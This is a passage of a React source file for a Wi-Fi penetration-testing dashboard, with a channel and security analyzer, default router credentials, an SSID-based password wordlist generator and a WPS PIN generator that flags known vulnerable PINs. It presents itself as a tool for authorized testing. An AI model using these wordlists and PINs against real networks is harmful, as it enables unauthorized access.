  const allNetworks = useMemo(() => {
    const all = [...networks, ...manualNetworks];
    return all.sort((a, b) => {
      const av = a[sortKey], bv = b[sortKey];
      if (typeof av === 'number') return sortDir === 'asc' ? av - bv : bv - av;
      return sortDir === 'asc' ? String(av).localeCompare(String(bv)) : String(bv).localeCompare(String(av));
    });
  }, [networks, manualNetworks, sortKey, sortDir]);

  const channelData = useMemo(() => {
    const chMap = {};
    allNetworks.forEach(n => {
      if (n.channel > 0) chMap[n.channel] = (chMap[n.channel] || 0) + 1;
    });
    return chMap;
  }, [allNetworks]);

  const bestChannel = useMemo(() => {
    if (allNetworks.length === 0) return null;
    const has5g = allNetworks.some(n => n.channel > 14);
    const channels2g = [1, 6, 11];
    const channels5g = [36, 40, 44, 48, 149, 153, 157, 161];
    const candidates = has5g ? [...channels2g, ...channels5g] : channels2g;
    let best = candidates[0], bestCount = Infinity;
    for (const ch of candidates) {
      const count = channelData[ch] || 0;
      if (count < bestCount) { bestCount = count; best = ch; }
    }
    return best;
  }, [allNetworks, channelData]);

  const handleParse = () => setNetworks(parseWifiOutput(rawInput));

  const handleSort = key => {
    if (sortKey === key) setSortDir(d => d === 'asc' ? 'desc' : 'asc');
    else { setSortKey(key); setSortDir('desc'); }
  };

  const handleAddManual = () => {
    if (!manualForm.ssid) return;
    const ch = parseInt(manualForm.channel) || 1;
    setManualNetworks(prev => [...prev, {
      ssid: manualForm.ssid,
      bssid: manualForm.bssid || 'XX:XX:XX:XX:XX:XX',
      channel: ch,
      signal: parseInt(manualForm.signal) || -70,
      security: manualForm.security,
      frequency: ch > 14 ? '5 GHz' : '2.4 GHz',
      manual: true,
    }]);
    setManualForm({ ssid: '', bssid: '', channel: '', signal: '', security: 'WPA2' });
  };

  const securityColor = sec => {
    if (/open/i.test(sec)) return '#F87171';
    if (/wep/i.test(sec)) return '#FBBF24';
    if (/wpa3/i.test(sec)) return '#34D399';
    return ACC;
  };

  const maxChCount = Math.max(1, ...Object.values(channelData));

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      {/* Input */}
      <Card>
        <SectionTitle icon={Terminal} text="Paste WiFi Scan Output" />
        <span style={{ fontFamily: mono, fontSize: 10, color: DIM, display: 'block', marginBottom: 8 }}>
          Supports: <code style={{ color: ACC }}>iwlist scan</code> · <code style={{ color: ACC }}>nmcli dev wifi list</code> · <code style={{ color: ACC }}>airport -s</code>
        </span>
        <textarea
          value={rawInput}
          onChange={e => setRawInput(e.target.value)}
          placeholder={`Paste output here...\n\nExample (airport -s):\n                            SSID BSSID             RSSI CHANNEL HT CC SECURITY\n                      MyNetwork 00:1a:2b:3c:4d:5e -45  6       Y  -- WPA2(PSK/AES/AES)\n                      CoffeeWiFi 11:22:33:44:55:66 -72  1       Y  -- WPA2(PSK/AES/AES)\n                    OpenNetwork 77:88:99:aa:bb:cc -80  11      Y  -- NONE`}
          style={{
            width: '100%', height: 140, padding: 12, borderRadius: 8, resize: 'vertical',
            background: '#0a0e17', border: `1px solid ${BORDER}`, outline: 'none',
            fontFamily: mono, fontSize: 11, color: TEXT, lineHeight: 1.5,
          }}
        />
        <button
          onClick={handleParse}
          style={{
            marginTop: 8, display: 'flex', alignItems: 'center', gap: 6,
            padding: '8px 16px', borderRadius: 8, cursor: 'pointer',
            fontFamily: mono, fontSize: 11, fontWeight: 600,
            background: `${ACC}15`, border: `1px solid ${ACC}30`, color: ACC,
          }}
        >
          <RefreshCw size={13} /> Parse Networks
        </button>
      </Card>

      {/* Manual Entry */}
      <Card>
        <SectionTitle icon={Plus} text="Manual Network Entry" />
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr) auto', gap: 8, alignItems: 'flex-end' }}>
          <Input label="SSID" value={manualForm.ssid} onChange={e => setManualForm(p => ({ ...p, ssid: e.target.value }))} placeholder="NetworkName" />
          <Input label="BSSID" value={manualForm.bssid} onChange={e => setManualForm(p => ({ ...p, bssid: e.target.value }))} placeholder="AA:BB:CC:DD:EE:FF" />
          <Input label="Channel" value={manualForm.channel} onChange={e => setManualForm(p => ({ ...p, channel: e.target.value }))} placeholder="6" />
          <Input label="Signal (dBm)" value={manualForm.signal} onChange={e => setManualForm(p => ({ ...p, signal: e.target.value }))} placeholder="-65" />
          <div>
            <label style={{ fontFamily: mono, fontSize: 10, color: DIM, fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.05em', display: 'block', marginBottom: 6 }}>Security</label>
            <select
              value={manualForm.security}
              onChange={e => setManualForm(p => ({ ...p, security: e.target.value }))}
              style={{
                width: '100%', padding: '8px 10px', borderRadius: 8,
                background: '#12161F', border: `1px solid ${BORDER}`, outline: 'none',
                fontFamily: mono, fontSize: 11, color: TEXT,
              }}
            >
              {['WPA3', 'WPA2', 'WPA', 'WEP', 'Open'].map(s => <option key={s} value={s}>{s}</option>)}
            </select>
          </div>
          <button
            onClick={handleAddManual}
            style={{
              padding: '8px 14px', borderRadius: 8, cursor: 'pointer',
              background: `${ACC}15`, border: `1px solid ${ACC}30`, color: ACC,
              fontFamily: mono, fontSize: 11, fontWeight: 600, whiteSpace: 'nowrap',
            }}
          >
            <Plus size={13} style={{ display: 'inline', verticalAlign: 'middle' }} /> Add
          </button>
        </div>
      </Card>

      {allNetworks.length > 0 && (
        <>
          {/* Network Table */}
          <Card>
            <SectionTitle icon={Wifi} text={`Detected Networks (${allNetworks.length})`} />
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: 11 }}>
                <thead>
                  <tr>
                    {[
                      { key: 'signal', label: 'Signal' },
                      { key: 'ssid', label: 'SSID' },
                      { key: 'bssid', label: 'BSSID' },
                      { key: 'channel', label: 'CH' },
                      { key: 'frequency', label: 'Band' },
                      { key: 'security', label: 'Security' },
                    ].map(h => (
                      <th
                        key={h.key}
                        onClick={() => handleSort(h.key)}
                        style={{
                          textAlign: 'left', padding: '8px 12px', borderBottom: `1px solid ${BORDER}`,
                          color: sortKey === h.key ? ACC : DIM, fontSize: 10, fontWeight: 600,
                          textTransform: 'uppercase', cursor: 'pointer', userSelect: 'none',
                        }}
                      >
                        {h.label} {sortKey === h.key && (sortDir === 'asc' ? '↑' : '↓')}
                      </th>
                    ))}
                    <th style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM, fontSize: 10, fontWeight: 600, textTransform: 'uppercase' }}>Flags</th>
                  </tr>
                </thead>
                <tbody>
                  {allNetworks.map((n, i) => {
                    const flags = [];
                    if (/open/i.test(n.security)) flags.push({ text: '⚠ OPEN', color: '#F87171' });
                    if (/wep/i.test(n.security)) flags.push({ text: '⚠ WEP', color: '#FBBF24' });
                    return (
                      <tr key={i} style={{ background: i % 2 === 0 ? 'rgba(255,255,255,0.01)' : 'transparent' }}>
                        <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}` }}>
                          <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                            <SignalBars strength={n.signal} />
                            <span style={{ color: TEXT, fontSize: 10 }}>{n.signal} dBm</span>
                          </div>
                        </td>
                        <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: TEXT, fontWeight: 600 }}>
                          {n.ssid || '(Hidden)'} {n.manual && <Badge text="manual" color="#A78BFA" />}
                        </td>
                        <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM }}>{n.bssid}</td>
                        <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: ACC }}>{n.channel}</td>
                        <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM }}>{n.frequency}</td>
                        <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}` }}>
                          <Badge text={n.security} color={securityColor(n.security)} />
                        </td>
                        <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}` }}>
                          {flags.map((f, j) => <Badge key={j} text={f.text} color={f.color} />)}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </Card>

          {/* Channel Chart */}
          <Card>
            <SectionTitle icon={BarChart3} text="Channel Utilization" />
            <div style={{ display: 'flex', gap: 16 }}>
              <div style={{ flex: 1 }}>
                <span style={{ fontFamily: mono, fontSize: 10, color: DIM, display: 'block', marginBottom: 8 }}>2.4 GHz (Channels 1–14)</span>
                <div style={{ display: 'flex', alignItems: 'flex-end', gap: 2, height: 80 }}>
                  {Array.from({ length: 14 }, (_, i) => i + 1).map(ch => {
                    const count = channelData[ch] || 0;
                    const h = count > 0 ? Math.max(8, (count / maxChCount) * 70) : 4;
                    const isBest = bestChannel === ch;
                    return (
                      <div key={ch} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', flex: 1, gap: 2 }}>
                        {count > 0 && <span style={{ fontFamily: mono, fontSize: 8, color: DIM }}>{count}</span>}
                        <div style={{
                          width: '100%', height: h, borderRadius: 3,
                          background: isBest ? '#34D399' : count > 0 ? ACC : 'rgba(255,255,255,0.06)',
                          border: isBest ? '1px solid #34D39950' : 'none',
                          transition: 'height 200ms ease',
                        }} />
                        <span style={{ fontFamily: mono, fontSize: 8, color: isBest ? '#34D399' : DIM }}>{ch}</span>
                      </div>
                    );
                  })}
                </div>
              </div>
              {allNetworks.some(n => n.channel > 14) && (
                <div style={{ flex: 1 }}>
                  <span style={{ fontFamily: mono, fontSize: 10, color: DIM, display: 'block', marginBottom: 8 }}>5 GHz (Channels 36–165)</span>
                  <div style={{ display: 'flex', alignItems: 'flex-end', gap: 2, height: 80 }}>
                    {[36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165].map(ch => {
                      const count = channelData[ch] || 0;
                      const h = count > 0 ? Math.max(8, (count / maxChCount) * 70) : 4;
                      const isBest = bestChannel === ch;
                      return (
                        <div key={ch} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', flex: 1, gap: 2 }}>
                          {count > 0 && <span style={{ fontFamily: mono, fontSize: 7, color: DIM }}>{count}</span>}
                          <div style={{
                            width: '100%', height: h, borderRadius: 3,
                            background: isBest ? '#34D399' : count > 0 ? ACC : 'rgba(255,255,255,0.06)',
                          }} />
                          <span style={{ fontFamily: mono, fontSize: 7, color: isBest ? '#34D399' : DIM }}>{ch}</span>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}
            </div>
            {bestChannel && (
              <div style={{
                marginTop: 12, padding: '8px 14px', borderRadius: 6,
                background: 'rgba(52,211,153,0.06)', border: '1px solid rgba(52,211,153,0.15)',
                fontFamily: mono, fontSize: 11, color: '#34D399',
              }}>
                ✓ Recommended least congested channel: <strong>{bestChannel}</strong>
                {bestChannel > 14 ? ' (5 GHz)' : ' (2.4 GHz)'}
              </div>
            )}
          </Card>

          {/* Security Assessment */}
          <Card>
            <SectionTitle icon={Shield} text="Security Assessment" />
            <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
              {allNetworks.filter(n => /open|wep/i.test(n.security)).map((n, i) => (
                <div key={i} style={{
                  padding: '8px 12px', borderRadius: 6, display: 'flex', alignItems: 'center', gap: 10,
                  background: /open/i.test(n.security) ? 'rgba(248,113,113,0.06)' : 'rgba(251,191,36,0.06)',
                  border: `1px solid ${/open/i.test(n.security) ? 'rgba(248,113,113,0.2)' : 'rgba(251,191,36,0.2)'}`,
                }}>
                  <AlertTriangle size={13} style={{ color: /open/i.test(n.security) ? '#F87171' : '#FBBF24', flexShrink: 0 }} />
                  <span style={{ fontFamily: mono, fontSize: 11, color: TEXT }}>
                    <strong>{n.ssid || 'Hidden'}</strong> — {/open/i.test(n.security) ? 'No encryption! All traffic is visible.' : 'WEP encryption is trivially breakable.'}
                  </span>
                </div>
              ))}
              {allNetworks.filter(n => /open|wep/i.test(n.security)).length === 0 && (
                <div style={{ fontFamily: mono, fontSize: 11, color: '#34D399', padding: '8px 12px' }}>
                  ✓ No insecure networks detected. All use WPA or better.
                </div>
              )}
            </div>
          </Card>
        </>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  TAB 5: WORDLISTS
// ═══════════════════════════════════════════════════════

function WordlistTab() {
  const [section, setSection] = useState('defaults');
  const [ssidInput, setSsidInput] = useState('');
  const [generatedWords, setGeneratedWords] = useState([]);
  const [wpsCount, setWpsCount] = useState(50);
  const [generatedPins, setGeneratedPins] = useState([]);

  const generateFromSSID = useCallback(() => {
    if (!ssidInput.trim()) return;
    const ssid = ssidInput.trim();
    const words = new Set();
    const base = ssid.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
    const upper = base.charAt(0).toUpperCase() + base.slice(1);

    // Basic variants
    [base, upper, ssid, ssid.toLowerCase(), ssid.toUpperCase()].forEach(w => words.add(w));

    // With numbers
    for (const suffix of ['1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '!', '!!', '#', '@', '01', '00', '99']) {
      words.add(base + suffix);
      words.add(upper + suffix);
    }

    // With years
    for (let y = 2018; y <= 2026; y++) {
      words.add(base + y);
      words.add(upper + y);
      words.add(base + y + '!');
      words.add(upper + y + '!');
    }

    // ISP patterns (common default password patterns)
    const hex = Array.from({ length: 8 }, () => '0123456789ABCDEF'[Math.floor(Math.random() * 16)]).join('');
    words.add(hex);
    for (let i = 0; i < 5; i++) {
      words.add(Array.from({ length: 8 }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join(''));
      words.add(Array.from({ length: 10 }, () => 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 36)]).join(''));
    }

    // Common patterns with SSID
    ['wifi', 'pass', 'password', 'guest', 'admin', 'key', 'net', 'welcome'].forEach(p => {
      words.add(p + base);
      words.add(base + p);
      words.add(p + upper);
      words.add(upper + p);
    });

    // Phone-like 8-digit
    for (let i = 0; i < 5; i++) {
      words.add(String(Math.floor(10000000 + Math.random() * 90000000)));
    }

    setGeneratedWords(Array.from(words).filter(w => w.length >= 8));
  }, [ssidInput]);

  const generateWPSPins = useCallback(() => {
    const pins = new Set(WPS_KNOWN_PINS);
    while (pins.size < wpsCount) {
      const base7 = String(Math.floor(Math.random() * 10000000)).padStart(7, '0');
      let sum = 0;
      for (let i = 0; i < 7; i++) {
        sum += parseInt(base7[i]) * (i % 2 === 0 ? 3 : 1);
      }
      const checksum = (10 - (sum % 10)) % 10;
      pins.add(base7 + checksum);
    }
    setGeneratedPins(Array.from(pins).slice(0, wpsCount));
  }, [wpsCount]);

  const allDefaults = useMemo(() =>
    ROUTER_DEFAULTS.flatMap(r => r.patterns.map(p => `${r.brand}: ${r.defaultUser} / ${p || '(blank)'}`)),
  []);

  const allPatterns = useMemo(() =>
    COMMON_PATTERNS.flatMap(c => c.examples),
  []);

  const handleDownload = useCallback((content, filename) => {
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  }, []);

  const sections = [
    { key: 'defaults', label: 'Router Defaults', icon: Key },
    { key: 'patterns', label: 'Common Patterns', icon: Hash },
    { key: 'wps', label: 'WPS PINs', icon: Lock },
    { key: 'ssidgen', label: 'SSID Generator', icon: Wifi },
  ];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <div style={{ display: 'flex', gap: 6 }}>
        {sections.map(s => {
          const Icon = s.icon;
          const active = section === s.key;
          return (
            <button
              key={s.key}
              onClick={() => setSection(s.key)}
              style={{
                display: 'flex', alignItems: 'center', gap: 6,
                padding: '6px 14px', borderRadius: 6, cursor: 'pointer',
                fontFamily: mono, fontSize: 10, fontWeight: 600,
                background: active ? `${ACC}12` : 'transparent',
                border: active ? `1px solid ${ACC}30` : `1px solid ${BORDER}`,
                color: active ? ACC : '#6B7280',
              }}
            >
              <Icon size={12} /> {s.label}
            </button>
          );
        })}
      </div>

      {section === 'defaults' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <SectionTitle icon={Key} text={`Default Router Passwords (${ROUTER_DEFAULTS.length} brands)`} />
            <div style={{ display: 'flex', gap: 6 }}>
              <button onClick={() => navigator.clipboard.writeText(allDefaults.join('\n'))} style={{
                display: 'flex', alignItems: 'center', gap: 5, padding: '6px 12px', borderRadius: 6,
                fontFamily: mono, fontSize: 10, fontWeight: 600, cursor: 'pointer',
                background: `${ACC}10`, border: `1px solid ${ACC}25`, color: ACC,
              }}>
                <Copy size={11} /> Copy All
              </button>
              <button onClick={() => handleDownload(allDefaults.join('\n'), 'router-defaults.txt')} style={{
                display: 'flex', alignItems: 'center', gap: 5, padding: '6px 12px', borderRadius: 6,
                fontFamily: mono, fontSize: 10, fontWeight: 600, cursor: 'pointer',
                background: 'transparent', border: `1px solid ${BORDER}`, color: DIM,
              }}>
                <Download size={11} /> .txt
              </button>
            </div>
          </div>
          <Card>
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: 11 }}>
                <thead>
                  <tr>
                    {['Brand', 'Default User', 'Passwords', 'Notes'].map(h => (
                      <th key={h} style={{ textAlign: 'left', padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM, fontSize: 10, fontWeight: 600, textTransform: 'uppercase' }}>{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {ROUTER_DEFAULTS.map((r, i) => (
                    <tr key={i} style={{ background: i % 2 === 0 ? 'rgba(255,255,255,0.01)' : 'transparent' }}>
                      <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: ACC, fontWeight: 600 }}>{r.brand}</td>
                      <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: TEXT }}>{r.defaultUser}</td>
                      <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: TEXT }}>
                        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                          {r.patterns.map((p, j) => (
                            <span key={j} style={{
                              padding: '2px 6px', borderRadius: 4, fontSize: 10,
                              background: 'rgba(255,255,255,0.04)', border: `1px solid ${BORDER}`,
                              color: p === '' ? '#6B7280' : TEXT,
                              fontStyle: p === '' ? 'italic' : 'normal',
                            }}>
                              {p || '(blank)'}
                            </span>
                          ))}
                        </div>
                      </td>
                      <td style={{ padding: '8px 12px', borderBottom: `1px solid ${BORDER}`, color: DIM, fontSize: 10 }}>{r.notes}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </Card>
        </div>
      )}

      {section === 'patterns' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <SectionTitle icon={Hash} text="Common WiFi Password Patterns" />
            <div style={{ display: 'flex', gap: 6 }}>
              <button onClick={() => navigator.clipboard.writeText(allPatterns.join('\n'))} style={{
                display: 'flex', alignItems: 'center', gap: 5, padding: '6px 12px', borderRadius: 6,
                fontFamily: mono, fontSize: 10, fontWeight: 600, cursor: 'pointer',
                background: `${ACC}10`, border: `1px solid ${ACC}25`, color: ACC,
              }}>
                <Copy size={11} /> Copy All
              </button>
              <button onClick={() => handleDownload(allPatterns.join('\n'), 'common-patterns.txt')} style={{
                display: 'flex', alignItems: 'center', gap: 5, padding: '6px 12px', borderRadius: 6,
                fontFamily: mono, fontSize: 10, fontWeight: 600, cursor: 'pointer',
                background: 'transparent', border: `1px solid ${BORDER}`, color: DIM,
              }}>
                <Download size={11} /> .txt
              </button>
            </div>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(300px, 1fr))', gap: 10 }}>
            {COMMON_PATTERNS.map((cat, i) => (
              <Card key={i}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
                  <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 700, color: TEXT }}>{cat.category}</span>
                  <Badge text={`${cat.examples.length}`} />
                </div>
                <span style={{ fontFamily: mono, fontSize: 10, color: DIM, display: 'block', marginBottom: 8 }}>{cat.desc}</span>
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                  {cat.examples.map((ex, j) => (
                    <div key={j} style={{
                      display: 'flex', alignItems: 'center', gap: 4,
                      padding: '3px 8px', borderRadius: 4,
                      background: 'rgba(125,211,252,0.05)', border: `1px solid ${BORDER}`,
                    }}>
                      <span style={{ fontFamily: mono, fontSize: 10, color: ACC }}>{ex}</span>
                      <CopyButton text={ex} />
                    </div>
                  ))}
                </div>
              </Card>
            ))}
          </div>
        </div>
      )}

      {section === 'wps' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          <SectionTitle icon={Lock} text="WPS PIN Generator" />
          <Card>
            <span style={{ fontFamily: mono, fontSize: 10, color: DIM, display: 'block', marginBottom: 10 }}>
              Generate WPS PINs including known Pixie Dust vulnerable PINs and algorithm-generated candidates. The last digit is a checksum per the WPS spec.
            </span>
            <div style={{ display: 'flex', alignItems: 'flex-end', gap: 10, marginBottom: 12 }}>
              <Input label="Number of PINs" value={wpsCount} onChange={e => setWpsCount(parseInt(e.target.value) || 50)} placeholder="50" />
              <button onClick={generateWPSPins} style={{
                padding: '8px 16px', borderRadius: 8, cursor: 'pointer',
                fontFamily: mono, fontSize: 11, fontWeight: 600,
                background: `${ACC}15`, border: `1px solid ${ACC}30`, color: ACC,
              }}>
                Generate PINs
              </button>
            </div>
            {generatedPins.length > 0 && (
              <>
                <div style={{ display: 'flex', justifyContent: 'flex-end', gap: 6, marginBottom: 8 }}>
                  <button onClick={() => navigator.clipboard.writeText(generatedPins.join('\n'))} style={{
                    display: 'flex', alignItems: 'center', gap: 5, padding: '5px 10px', borderRadius: 6,
                    fontFamily: mono, fontSize: 10, fontWeight: 600, cursor: 'pointer',
                    background: `${ACC}10`, border: `1px solid ${ACC}25`, color: ACC,
                  }}>
                    <Copy size={11} /> Copy All
                  </button>
                  <button onClick={() => handleDownload(generatedPins.join('\n'), 'wps-pins.txt')} style={{
                    display: 'flex', alignItems: 'center', gap: 5, padding: '5px 10px', borderRadius: 6,
                    fontFamily: mono, fontSize: 10, fontWeight: 600, cursor: 'pointer',
                    background: 'transparent', border: `1px solid ${BORDER}`, color: DIM,
                  }}>
                    <Download size={11} /> .txt
                  </button>
                </div>
                <div style={{
                  display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(100px, 1fr))', gap: 4,
                  maxHeight: 300, overflow: 'auto',
                }}>
                  {generatedPins.map((pin, i) => (
                    <div key={i} style={{
                      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                      padding: '4px 8px', borderRadius: 4,
                      background: WPS_KNOWN_PINS.includes(pin) ? 'rgba(248,113,113,0.08)' : 'rgba(255,255,255,0.02)',
                      border: WPS_KNOWN_PINS.includes(pin) ? '1px solid rgba(248,113,113,0.2)' : `1px solid ${BORDER}`,
                    }}>
                      <span style={{ fontFamily: mono, fontSize: 11, color: WPS_KNOWN_PINS.includes(pin) ? '#F87171' : ACC }}>
                        {pin}
                      </span>
                      <CopyButton text={pin} />
                    </div>
                  ))}
                </div>
                <span style={{ fontFamily: mono, fontSize: 9, color: DIM, marginTop: 6, display: 'block' }}>
                  Red highlighted = known vulnerable PINs (try these first)
                </span>
              </>
            )}
          </Card>
        </div>
      )}

      {section === 'ssidgen' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          <SectionTitle icon={Wifi} text="SSID-Based Wordlist Generator" />
          <Card>
            <span style={{ fontFamily: mono, fontSize: 10, color: DIM, display: 'block', marginBottom: 10 }}>
              Enter a target SSID to generate likely passwords based on ISP naming conventions, default patterns, and common user behaviors.
            </span>
            <div style={{ display: 'flex', alignItems: 'flex-end', gap: 10, marginBottom: 12 }}>
              <Input label="Target SSID" value={ssidInput} onChange={e => setSsidInput(e.target.value)} placeholder="e.g. NETGEAR-5G" style={{ flex: 1 }} />
              <button onClick={generateFromSSID} style={{
                padding: '8px 16px', borderRadius: 8, cursor: 'pointer',
                fontFamily: mono, fontSize: 11, fontWeight: 600,
                background: `${ACC}15`, border: `1px solid ${ACC}30`, color: ACC,
              }}>
                Generate
              </button>
            </div>
            {generatedWords.length > 0 && (
              <>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                  <span style={{ fontFamily: mono, fontSize: 10, color: DIM }}>
                    Generated {generatedWords.length} candidates (min 8 chars for WPA)
                  </span>
                  <div style={{ display: 'flex', gap: 6 }}>
                    <button onClick={() => navigator.clipboard.writeText(generatedWords.join('\n'))} style={{
                      display: 'flex', alignItems: 'center', gap: 5, padding: '5px 10px', borderRadius: 6,
                      fontFamily: mono, fontSize: 10, fontWeight: 600, cursor: 'pointer',
                      background: `${ACC}10`, border: `1px solid ${ACC}25`, color: ACC,
                    }}>
                      <Copy size={11} /> Copy All
                    </button>
                    <button onClick={() => handleDownload(generatedWords.join('\n'), `wordlist-${ssidInput}.txt`)} style={{
                      display: 'flex', alignItems: 'center', gap: 5, padding: '5px 10px', borderRadius: 6,
                      fontFamily: mono, fontSize: 10, fontWeight: 600, cursor: 'pointer',
                      background: 'transparent', border: `1px solid ${BORDER}`, color: DIM,
                    }}>
                      <Download size={11} /> .txt
                    </button>
                  </div>
                </div>
                <div style={{
                  maxHeight: 350, overflow: 'auto', borderRadius: 8,
                  background: '#0a0e17', border: `1px solid ${BORDER}`, padding: 12,
                }}>
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(160px, 1fr))', gap: 4 }}>
                    {generatedWords.map((w, i) => (
                      <div key={i} style={{
                        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                        padding: '3px 8px', borderRadius: 4, background: 'rgba(255,255,255,0.02)',
                      }}>
                        <span style={{ fontFamily: mono, fontSize: 10, color: ACC }}>{w}</span>
                        <CopyButton text={w} />
                      </div>
                    ))}
                  </div>
                </div>
              </>
            )}
          </Card>
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  MAIN COMPONENT
// ═══════════════════════════════════════════════════════

export default function WifiPortal() {
  const [tab, setTab] = useState('portal');
  const [search, setSearch] = useState('');

  const tabContent = useMemo(() => {
    switch (tab) {
      case 'portal': return <PortalTab />;
      case 'attacks': return <AttackTab search={search} />;
      case 'flipper': return <FlipperTab search={search} />;
      case 'analyzer': return <AnalyzerTab />;
      case 'wordlists': return <WordlistTab />;
      default: return null;
    }
  }, [tab, search]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16, height: 'calc(100vh - 120px)' }}>
      {/* Disclaimer */}
      <div style={{
        padding: '8px 14px', borderRadius: 8, display: 'flex', alignItems: 'center', gap: 8,
        background: 'rgba(251,191,36,0.06)', border: '1px solid rgba(251,191,36,0.15)',
      }}>
        <AlertTriangle size={14} style={{ color: '#FBBF24', flexShrink: 0 }} />
        <span style={{ fontFamily: mono, fontSize: 10, color: '#FBBF24', lineHeight: 1.5 }}>
          For authorized penetration testing and security research only. Unauthorized access to computer networks is illegal.
        </span>
      </div>

      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          <div style={{
            width: 36, height: 36, borderRadius: 10,
            background: 'rgba(125,211,252,0.1)', border: '1px solid rgba(125,211,252,0.2)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
          }}>
            <Wifi size={18} style={{ color: ACC }} />
          </div>
          <div>
            <h1 style={{
              fontFamily: heading, fontSize: 22, fontWeight: 700, color: TEXT,
              margin: 0, letterSpacing: '-0.02em',
            }}>
              WiFi & Wireless
            </h1>
            <span style={{ fontFamily: mono, fontSize: 10, color: '#4B5563' }}>
              captive portals · attack reference · flipper zero · analyzer
            </span>
          </div>
        </div>

        {/* Search */}
        <div style={{
          display: 'flex', alignItems: 'center', gap: 8,
          background: '#11151E', border: '1px solid rgba(255,255,255,0.04)',
          borderRadius: 8, padding: '6px 12px', width: 280,
        }}>
          <Search size={13} style={{ color: '#4B5563', flexShrink: 0 }} />
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search..."
            style={{
              background: 'transparent', border: 'none', outline: 'none', width: '100%',
              fontFamily: mono, fontSize: 11, color: TEXT,
            }}
          />
          {search && (
            <button
              onClick={() => setSearch('')}
              style={{
                background: 'none', border: 'none', cursor: 'pointer',
                fontFamily: mono, fontSize: 10, color: '#4B5563', padding: '2px 4px',
              }}
            >
              ✕
            </button>
          )}
        </div>
      </div>

      {/* Tabs */}
      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
        {TABS.map(t => {
          const active = tab === t.key;
          const Icon = t.icon;
          return (
            <button
              key={t.key}
              onClick={() => setTab(t.key)}
              style={{
                display: 'flex', alignItems: 'center', gap: 6,
                padding: '8px 16px', borderRadius: 8, cursor: 'pointer',
                fontFamily: mono, fontSize: 11, fontWeight: 500,
                background: active ? 'rgba(125,211,252,0.08)' : 'transparent',
                border: active ? '1px solid rgba(125,211,252,0.12)' : '1px solid transparent',
                color: active ? ACC : '#6B7280',
                transition: 'all 120ms ease',
              }}
            >
              <Icon size={13} />
              {t.label}
            </button>
          );
        })}
      </div>

      {/* Tab Content */}
      <div style={{ flex: 1, overflow: 'auto', paddingBottom: 40 }}>
        {tabContent}
      </div>
    </div>
  );
}
